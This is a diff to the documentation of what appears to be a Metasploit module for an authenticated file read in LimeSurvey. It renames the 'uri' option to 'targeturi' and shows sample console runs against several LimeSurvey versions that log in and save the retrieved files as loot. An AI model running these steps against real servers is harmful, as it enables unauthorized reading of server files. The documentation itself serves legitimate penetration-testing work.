@@ -32,7 +32,7 @@ Versions can be downloaded from [github](https://github.com/LimeSurvey/LimeSurve
   4. Do: ```set file [file]```
   5. Do: ```set rhosts [ip]```
   6. Do: ```run```
-  7. You should get a shell.
+  7. If the file is readable, you should retrieve a file from the application
 
 ## Options
 
@@ -51,8 +51,8 @@ resource (lime41.rb)> set rhosts 2.2.2.2
 rhosts => 2.2.2.2
 resource (lime41.rb)> set verbose true
 verbose => true
-resource (lime41.rb)> set uri /LimeSurvey-4.1.11-200316/
-uri => /LimeSurvey-4.1.11-200316/
+resource (lime41.rb)> set targeturi /LimeSurvey-4.1.11-200316/
+targeturi => /LimeSurvey-4.1.11-200316/
 resource (lime41.rb)> run
 [*] CSRF: YII_CSRF_TOKEN => SzF-eUl4RW1lU0h-aFZxWmNwbGZOREJrYUduZzI1WTaGH7eqrOmgcse5liKfPNZ8qqKkvenm5Fu6oxTSyVWDrQ==
 [+] Login Successful
@@ -61,8 +61,8 @@ resource (lime41.rb)> run
 [+] File stored to: /home/h00die/.msf4/loot/20200408141207_default_2.2.2.2__164991.txt
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
-resource (lime41.rb)> set uri /LimeSurvey-3.15.0-181008/
-uri => /LimeSurvey-3.15.0-181008/
+resource (lime41.rb)> set targeturi /LimeSurvey-3.15.0-181008/
+targeturi => /LimeSurvey-3.15.0-181008/
 resource (lime41.rb)> run
 [*] CSRF: YII_CSRF_TOKEN => SDNyc21VYXJONmIwbjFkOENmUzEyS1NMX3lPQ0VYRTJyfE0iGABAxOsuZhxGdZd59W3dNCVx2D6JABRxmu6dgw==
 [+] Login Successful
@@ -71,8 +71,8 @@ resource (lime41.rb)> run
 [+] File stored to: /home/h00die/.msf4/loot/20200408141207_default_2.2.2.2__530709.txt
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
-resource (lime41.rb)> set uri /LimeSurvey-3.9.0-180604/
-uri => /LimeSurvey-3.9.0-180604/
+resource (lime41.rb)> set targeturi /LimeSurvey-3.9.0-180604/
+targeturi => /LimeSurvey-3.9.0-180604/
 resource (lime41.rb)> run
 [*] CSRF: YII_CSRF_TOKEN => QldPa0lZM0o0cUV-STU4NWVoYVlDdHNtYmhmVVl6NW39a1wvfep0Ccsuz_gx9V1AnMjtADnprALM7qwvxUz3Wg==
 [+] Login Successful
@@ -81,8 +81,8 @@ resource (lime41.rb)> run
 [+] File stored to: /home/h00die/.msf4/loot/20200408141208_default_2.2.2.2__407491.txt
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
-resource (lime41.rb)> set uri /LimeSurvey-3.6.0-180328/
-uri => /LimeSurvey-3.6.0-180328/
+resource (lime41.rb)> set targeturi /LimeSurvey-3.6.0-180328/
+targeturi => /LimeSurvey-3.6.0-180328/
 resource (lime41.rb)> run
 [*] CSRF: YII_CSRF_TOKEN => SHJzSk81ak5rdWdONTJWV0VLQTlHcjRKeGNIaFlYREqfcU-BuMlPRimIHJipKDsrCF3i7j29J4bNFwxsYGD42A==
 [+] Login Successful
@@ -91,8 +91,8 @@ resource (lime41.rb)> run
 [+] File stored to: /home/h00die/.msf4/loot/20200408141208_default_2.2.2.2__228237.txt
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
-resource (lime41.rb)> set uri /LimeSurvey-3.0.0-171222/
-uri => /LimeSurvey-3.0.0-171222/
+resource (lime41.rb)> set targeturi /LimeSurvey-3.0.0-171222/
+targeturi => /LimeSurvey-3.0.0-171222/
 resource (lime41.rb)> run
 [*] CSRF: YII_CSRF_TOKEN => T1VkbDlhYU9IbkZHel9wd0JoVVl5RTUxQ2h2Mk9yN0-AXAtaTDCOMX8gWru7EmBHPBumgY0FG0vAFLwCwyeeuA==
 [+] Login Successful
@@ -101,8 +101,8 @@ resource (lime41.rb)> run
 [+] File stored to: /home/h00die/.msf4/loot/20200408141209_default_2.2.2.2__611969.txt
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
-resource (lime41.rb)> set uri /LimeSurvey-2.70.0-170921/
-uri => /LimeSurvey-2.70.0-170921/
+resource (lime41.rb)> set targeturi /LimeSurvey-2.70.0-170921/
+targeturi => /LimeSurvey-2.70.0-170921/
 resource (lime41.rb)> run
 [*] CSRF: YII_CSRF_TOKEN => elhvTzJaWGlJWU10WnBFajlTYmN5a1VHY1M0bDNJd1C2okYXL__0in7KMlmwY6_Iuk8sI7H7s2zQPZ5NiWW_Xg==
 [+] Login Successful
